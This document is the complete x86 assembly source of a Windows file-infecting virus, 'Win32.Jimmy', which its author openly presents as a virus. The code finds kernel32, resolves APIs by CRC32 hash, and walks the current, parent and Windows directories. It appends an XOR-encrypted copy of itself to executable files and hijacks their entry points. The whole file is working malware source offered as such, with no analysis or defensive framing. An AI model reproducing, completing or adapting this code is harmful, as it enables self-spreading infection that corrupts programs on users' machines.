              

; Win32.Jimmy by SST@Hablas.com
;
; Infektion bei Win95/98/ME, WinNt4.0, WinNT2000
; Variable Xor Encryption
; Append Infector
;
; Yes, this is my first W32.Virus

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data                                   
 Data:
 filemask    db '*.Exe',0
 FileHandle  dd 0h
 NewSize     dd 0h
 AlignReg1   dd 0h
 InfCounter  dd 0h
 APICRC32    dd 0h
 Trash2 dd 0h

 DirectoryBuffer db 255d dup (0h)
 KernelMZ    dd 0h
 OTableVA    dd 0h
 MapHandle   dd 0h
 OldDirectory db 255d dup (0h)
 K32Trys     dd 0h
 counter     dw 0h
 AlignReg2   dd 0h

 APINames:
 dd 0FE248274h         
 dd 08C892DDFh        
 dd 0EBC6C18Bh      
 dd 0B2DBD7DCh        
 dd 0613FD7BAh       
 dd 0AE17EBEFh        
 dd 096B2D96Ch       
 dd 0AA700106h        
 dd 094524B42h      
 dd 0797B49ECh        
 dd 0C200BE21h        
 dd 068624A9Dh       

 ATableVA    dd 0h
 TempApisearch2 dd 0h

 APIOffsets:
 XGetWindowsDirectoryA  dd 0h
 XCreateFileA           dd 0h
 XGetCurrentDirectoryA  dd 0h
 XSetCurrentDirectoryA  dd 0h
 XGetTickCount          dd 0h
 XFindFirstFileA        dd 0h
 XCreateFileMappingA    dd 0h
 XFindNextFileA         dd 0h
 XUnmapViewOfFile       dd 0h
 XMapViewOfFile         dd 0h
 XFindClose             dd 0h
 XCloseHandle           dd 0h

 TempAPI     dd 0h
 KernelPE    dd 0h
 RandVal     dd 0h
 FindHandle  dd 0h
 OldEIP      dd 0h
 NewEIP      dd 0h
 MapAddress  dd 0h
 alte     dd 0h
 NTableVA    dd 0h
 Trash1      dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)
 groese equ (offset EndVirus - offset Virus )
 NumberOfApis equ 12
 encrypted = ( ( offset endofcrypt - offset encgo ) / 2 ) + 1

.code                                   
VirusCode:
Virus:
 call Delta                            
 dw 15662d
 dw 31058d
 codeofcrypt dw 0h
Delta:
 mov edx, dword ptr [esp]
 inc esp
 add esp, 3d
 sub edx, ( offset Delta - 6)
 mov ebp, edx
 mov edi, ebp
 or edi, edi
 jz encgo
 mov edx, encrypted
 lea ecx, [ebp+encgo]
encgoloop:
 xor bx, word ptr [ebp+codeofcrypt]
 mov word ptr [ecx], bx
 add ecx, 2
 dec edx
 jnz encgoloop
encgo:
 jmp KernelSearchStart
NoKernel:
 mov ebx, dword ptr [ebp+OldEIP]
 mov dword ptr [ebp+retEIP], ebx
 mov edi, dword ptr [ebp+alte]
 mov dword ptr [ebp+retBase], edi
 mov dword ptr [ebp+Trash2], edi
 mov edi, dword ptr [ebp+alte]
 mov dword ptr [ebp+retBase], edi

ExecuteHost:                            
 cmp ebp, 0
 je FirstGenHost
 mov ebx,12345678h
 org $-4
 retEIP dd 0h
 add ebx,12345678h
 org $-4
 retBase dd 0h
 push ebx
ret

FirstGenHost:                           
 sub ebx, ebx
 push ebx
 call ExitProcess
InfectEXE:                              
 call GetRand
 mov ebx, dword ptr [ebp+RandVal]
 mov word ptr [ebp+codeofcrypt], bx
                                       
 mov ecx, -49695d
 add ecx, 49695d
 add ecx, dword ptr [ebp+MapAddress]
                                        
 mov eax, [ecx+3Ch]
 add eax, ecx
                   
 add eax, 3Ch
 mov edx, [eax]
 sub eax, 3Ch
 mov ecx, dword ptr [ebp+WFD_nFileSizeLow]
                                        
 mov dword ptr [ebp+AlignReg2], -1
 and dword ptr [ebp+AlignReg2], edx
 sbb eax, 2d                            
 add ecx, groese
 mov dword ptr [ebp+AlignReg1], 0
 xor dword ptr [ebp+AlignReg1], ecx
 call Align
                                        
 and ecx, 0
 add ecx, dword ptr [ebp+AlignReg1]
                                        
 mov dword ptr [ebp+NewSize], ecx
 pushad
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], ecx
 call CreateMap
 jc NoEXE
 push  dword ptr [ebp+MapAddress]
 pop esi
                                        
 mov edx, dword ptr [esi+3Ch]
 add edx, esi
                                        
 push edx
 pop esi
  
 mov ebx,0
 mov bx, word ptr [esi+06h]
                                        
 mov ecx, 1d
 sub ebx, ecx
 imul ebx, ebx, 28h
                                        
 add edx, 120d
 add edx, ebx
 mov eax, dword ptr [esi+74h]
 shl eax, 3
 add edx, eax
                                        
 mov eax, dword ptr [esi+28h]
 mov dword ptr [ebp+OldEIP], eax
 mov ecx, dword ptr [esi+34h]
 push ecx
 pop  dword ptr [ebp+alte]
                                        
 push 0
 pop ecx

 add ecx, [edx+10h]
                                        
 push ecx
 pop ebx
 add edx, 14h
 add ecx, [edx]
 sub edx, 14h
 push ecx
 push ebx
 pop eax
 add eax, [edx+0Ch]
 mov [esi+28h], eax
 mov dword ptr [ebp+NewEIP], eax
                                        
 sub eax, eax

 add eax, [edx+10h]
 push eax
                                        
 add eax, groese
 push eax
 pop  dword ptr [ebp+AlignReg1]
 push dword ptr [esi+3Ch]
 pop dword ptr [ebp+AlignReg2]
 call Align
                                        
 sub eax, eax
 add eax, dword ptr [ebp+AlignReg1]
 mov dword ptr [edx+10h], 0h
 add dword ptr [edx+10h], eax
 pop eax
 add eax, groese
 mov dword ptr [edx+08h], 0
 add dword ptr [edx+08h], eax
 mov eax, dword ptr [edx+0Ch]
 add eax, dword ptr [edx+10h]
 mov dword ptr [esi+50h], 0h
 add dword ptr [esi+50h], eax
                                        
 or dword ptr [edx+24h], 0A0000020h
                                        
 mov dword ptr [esi+4Ch], 'Jimm'
                                        
 pop edi
 add edi, dword ptr [ebp+MapAddress]
 mov ecx, ( offset encgo - offset Virus )
 lea esi, [ebp+Virus]

AppendLoop:
 rep movsb
 push encrypted
 pop ecx

CryptAppendLoop:
 lodsw
 xor ax, word ptr [ebp+codeofcrypt]

 stosw
 sub ecx, 1
 jnz CryptAppendLoop
                                       
 mov edx, ( -1d xor 27d )
 xor edx, 27d
 and edx, dword ptr [ebp+InfCounter]
 sub edx, 1d
 rol eax, 16d                           
 push edx
 pop  dword ptr [ebp+InfCounter]
 clc
ret

NoEXE:
 stc
ret

InfectFile:                             
 cmp dword ptr [ebp+WFD_nFileSizeLow], 44000d
 jbe NoInfection
                                        
 cmp dword ptr [ebp+WFD_nFileSizeHigh], 0
 jne NoInfection
 call OpenFile                          
 jc NoInfection
                                        
 mov eax, dword ptr [ebp+MapAddress]
                                     
 cmp word ptr [eax], 'ZM'
 je Goodfile
                                       
 push 28785d
 pop ecx
 cmp ecx, 28785d
 je Notagoodfile

Goodfile:
 cmp word ptr [eax+3Ch], 0h
 jne _Notagoodfile
 jmp Notagoodfile
_Notagoodfile:
                                        
 xor ebx, ebx
 add ebx, [eax+3Ch]
                                       
 cmp dword ptr [ebp+WFD_nFileSizeLow],ebx
 jb Notagoodfile
 add ebx, eax
                                        
 cmp word ptr [ebx], 'EP'
 je Goodfile2
                                        
 push 24945d
 pop ecx
 cmp ecx, 24945d
 je Notagoodfile

Goodfile2:
                                        
 cmp dword ptr [ebx+4Ch], 'Jimm'
 jz Notagoodfile
                                       
 mov cx, word ptr [ebx+16h]
 rcl edx, 12d                           
 and cx, 0F000h
 cmp cx, 02000h
 je Notagoodfile
                                       
 mov cx, word ptr [ebx+16h]
 and cx, 00002h
 cmp cx, 00002h
 jne Notagoodfile
 call InfectEXE                         
 jc NoInfection
 and edx, ebx                         

Notagoodfile:
 call UnMapFile

NoInfection:
ret


Outbreak:                              
                                        
 mov esi, dword ptr [ebp+OldEIP]
 mov dword ptr [ebp+retEIP], esi
 mov ebx, dword ptr [ebp+alte]
 mov dword ptr [ebp+retBase], ebx
                                       
 call InfectCurDir
 mov eax, ebp
 add eax, offset OldDirectory
 push eax
                                        
 mov eax, ( 255d xor 32d )
 xor eax, 32d
 push eax
 call dword ptr [ebp+XGetCurrentDirectoryA]
                                        
 lea edx, [ebp+OldDirectory]
                                        
 mov ebx, edx

TravelDownLoop1:                        
 inc edx
 cmp byte ptr [edx], 0
 jne TravelDownLoop1
TravelDownLoop2:                        
 add edx, -1d
 cmp byte ptr [edx], '\'
 jne TravelDownNext
 mov byte ptr [edx], 0
 push ebx
 call dword ptr [ebp+XSetCurrentDirectoryA]
 pushad
 call InfectCurDir
 popad
 mov byte ptr [edx], '\'
TravelDownNext:
 cmp edx, ebx
 jne TravelDownLoop2
                                       
 mov eax, ( 255d + 16d )
 sub eax, 16d
 push eax
 lea ecx, [ebp+DirectoryBuffer]
 push ecx
 call dword ptr [ebp+XGetWindowsDirectoryA]
 xchg ecx, edx
 push edx
 call dword ptr [ebp+XSetCurrentDirectoryA]
 call InfectCurDir

 lea edx, [ebp+OldDirectory]
 push edx
 call dword ptr [ebp+XSetCurrentDirectoryA]

 jmp ExecuteHost

GetApis:                                
 push NumberOfApis
 pop eax
                                        
 mov esi, 37168d
 sub esi, 37168d
 add esi, dword ptr [ebp+KernelPE]
                                        
 mov edi, [esi+78h]
 add edi, [ebp+KernelMZ]
                                       
 add edi, 28d
                                        
 mov esi, dword ptr [edi]
 add esi, [ebp+KernelMZ]
 mov dword ptr [ebp+ATableVA], esi
                                        
 inc edi
 add edi, 3d
                                        
 mov esi, dword ptr [edi]
                                        
 add edi, 4d
 add esi, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], esi
                                        
 mov esi, dword ptr [edi]
 add esi, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], esi
                                        
 lea ecx, [ebp+APINames]
 mov esi, ebp
 add esi, offset APIOffsets

GetApisLoop: 
                                       
 and word ptr [ebp+counter], 0h

                                        
 inc ecx
 add ecx, 3d
                                        
 xor edx, edx
 add edx, dword ptr [ebp+TempAPI]
 mov dword ptr [esi], edx
                                       
 inc esi
 add esi, 3d
 dec eax
 jnz GetApisLoop
 jmp Outbreak

CRC32:
 pushad
                                        
 mov edi, -28264d
 add edi, 28264d
 add edi, esi
 push 0
 pop ebx
 add ebx, edi
LenCRC:
                                       
 sub ebx, -1d
 cmp byte ptr [ebx], 0
 jne LenCRC
 sub ebx, edi
                                        
 mov esi, ebx
                                       
 add esi, 1d
 cld
                                        
 mov eax, 16859d
 sub eax, 16859d
 dec eax
 sub eax, 0d
                                       
 mov edx, eax
NextByteCRC:
                                       
 mov ebx, -6128d
 add ebx, 6128d
                                        
 sub ecx, ecx
 mov bl, byte ptr [edi]
                                        
 inc edi
 xor bl, al
 mov al, ah
 mov ah, dl
 mov dl, dh
 mov dh, 8
NextBitCRC:
 shr cx, 1
 rcr bx, 1
jnc NoCRC
 xor bx,08320h
 xor cx,0EDB8h
NoCRC:
 dec dh
jnz NextBitCRC
 xor eax, ebx
 xor edx, ecx
 dec esi
jnz NextByteCRC
 not edx
 not eax
 mov ebx, edx
 rol ebx, 16d
 mov bx, ax
 mov dword ptr [ebp+APICRC32], ebx
 popad
ret

SearchAPI1:                            
 pushad

 push 0
 pop ebx
 add ebx, dword ptr [ebp+NTableVA]
 and dword ptr [ebp+Trash1], ebx        
 sar edx, 10d                          

SearchNextApi1:                         
 push ebx
 mov eax, dword ptr [ebx]
 add eax, [ebp+KernelMZ]
                                        
 push eax
 pop ebx
                                        
 push ebx
 pop esi
 push esi
 pop  dword ptr [ebp+TempApisearch2]
 push ecx
 cld
                                        
 call CRC32
                                       
 mov eax, 52825d
 sub eax, 52825d
 add eax, dword ptr [ebp+APICRC32]
 sub eax, dword ptr [ecx]
 cmp eax, 0
 je FoundApi1

ApiNotFound:                            
 pop ecx
                                        
 mov esi,0
 add esi, dword ptr [ebp+TempApisearch2]
 pop ebx
                                        
 inc ebx
 add ebx, 3d
 add word ptr [ebp+counter], 1h
 cmp word ptr [ebp+counter], 2002h
 je NotFoundApi1
 jmp SearchNextApi1

FoundApi1:                              
 add esp, 8d
                                        
 xor edx, edx
 mov dx, word ptr [ebp+counter]
                                       
 clc 
 rcl edx, 1                             
 add edx, dword ptr [ebp+OTableVA]
 push edx
 pop ebx
 movzx edx, word ptr [ebx]
 clc
 rcl edx, 2h
 add edx, dword ptr [ebp+ATableVA]
                                        
 mov ebx, dword ptr [ebp+KernelMZ]
 add ebx, dword ptr [edx]
 mov dword ptr [ebp+TempAPI], -1
 and dword ptr [ebp+TempAPI], ebx
 cmp byte ptr [ebx], 0cch               
 je ExecuteHost
 popad
ret

NotFoundApi1:
                                        
 pop esi
 popad
 jmp ExecuteHost

FindNextFileProc:                       
 call ClearOldData
 mov edx, ebp
 add edx, offset WIN32_FIND_DATA
 push edx
 mov ebx, dword ptr [ebp+FindHandle]
 push ebx
 call dword ptr [ebp+XFindNextFileA]
ret

ClearOldData:                           
 pushad
                                        
 push 276d
 pop eax
 lea edx, [ebp+WFD_szFileName]

ClearOldData2:
 mov byte ptr [edx], 0h
                                        
 dec eax
 jnz ClearOldData2
 popad
ret
                                        
FindFirstFileProc:
 call ClearOldData
 lea edx, [ebp+WIN32_FIND_DATA]
 push edx
 push ebx
 call dword ptr [ebp+XFindFirstFileA]
 push eax
 pop  dword ptr [ebp+FindHandle]
ret

Align:                                  
 pushad
                                     
 mov edx,0
 mov eax, dword ptr [ebp+AlignReg1]
 mov ecx, dword ptr [ebp+AlignReg2]
 div ecx
                                        
 inc eax
 mul ecx
 mov dword ptr [ebp+AlignReg1], 0h
 add dword ptr [ebp+AlignReg1], eax
 popad
ret
 db 'Win32.Jimmy - SST@Hablas.com',0
                                       
OpenFile:                              
 push 0
 push 0
 push 3
 push 0
 push 1
 mov ebx, 80000000h or 40000000h
 push ebx
 lea ebx, WFD_szFileName
 add ebx, ebp
 push ebx
 sal ecx, 28d                           
 call dword ptr [ebp+XCreateFileA]

 add eax, 1
 jz Closed
 dec eax

 mov dword ptr [ebp+FileHandle], eax

CreateMap:                              
 mov ecx, dword ptr [ebp+WFD_nFileSizeLow]
 push ecx
                                        
 and edx, 0
 push edx
 add ebx, eax                          
 push ecx
 push edx
 push 00000004h
 push edx
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], -1
 and dword ptr [ebp+MapHandle], eax
 pop ecx
 or eax, eax
 jz CloseFile
                                     
 push 0
 pop edx
 push ecx
 push edx
 push edx
 push 2h
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 test eax, eax
 jz UnMapFile
 mov dword ptr [ebp+MapAddress], -1
 and dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              
 Call UnMapFile2

CloseFile:                             
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret

InfectCurDir:                          
 mov [ebp+InfCounter], 2d
 mov ebx, offset filemask
 add ebx, ebp
                                       
 call FindFirstFileProc
 inc eax
 jz EndInfectCurDir

InfectCurDirFile:                      
 call InfectFile
                                       
 sub ecx, ecx
 add ecx, dword ptr [ebp+InfCounter]
 inc ecx
 dec ecx
 jz EndInfectCurDir
                                       
 call FindNextFileProc
 cmp eax, 0h
 jne InfectCurDirFile

EndInfectCurDir:
                                      
 push dword ptr [ebp+FindHandle]
 call dword ptr [ebp+XFindClose]

ret

KernelSearchStart:
                                       
 mov eax, dword ptr [esp]
                                       
 shr eax, 16d
 rol eax, 16d
                                        
 mov dword ptr [ebp+K32Trys], 4h

GK1:                                    
 mov edx, -1d
 and edx, dword ptr [ebp+K32Trys]
 or edx, edx
 jz NoKernel
                                       
 cmp word ptr [eax], 'ZM'
 je CheckPE

GK2:
                                       
 mov ebx, ( 65536d + 32d )
 sub ebx, 32d
 sub eax, ebx
 dec dword ptr [ebp+K32Trys]
 jmp GK1

CheckPE:                              
 mov edx, [eax+3Ch]
 xchg edx, eax
 add eax, edx
 xchg edx, eax
                                       
 movzx ebx, word ptr [edx]
 sub ebx, 'EP'
 jz CheckDLL
 jmp GK2

CheckDLL:

KernelFound:
 mov dword ptr [ebp+KernelMZ], -1
 not ecx                               
 and dword ptr [ebp+KernelMZ], eax
 mov dword ptr [ebp+KernelPE], edx

 lea eax, [ebp+offset GetApis]
 push eax
ret

GetRand:                                
 pushad
 add edx, dword ptr [ebp+RandVal]
 call dword ptr [ebp+XGetTickCount]
 add edx, eax
 mov dword ptr [ebp+RandVal], 0
 add dword ptr [ebp+RandVal], edx
 popad
 ret
endofcrypt:
EndVirus:
end VirusCode

